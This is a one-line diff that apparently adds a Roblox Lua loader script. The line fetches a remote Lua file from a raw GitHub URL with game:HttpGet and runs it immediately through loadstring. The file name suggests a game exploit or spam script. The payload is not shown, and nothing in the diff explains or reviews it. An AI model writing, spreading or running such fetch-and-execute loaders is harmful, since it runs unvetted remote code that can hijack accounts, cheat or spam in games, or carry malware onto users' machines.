@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/nuke-a-country-spam6-sr1rdzv3o8v63n.lua"))()
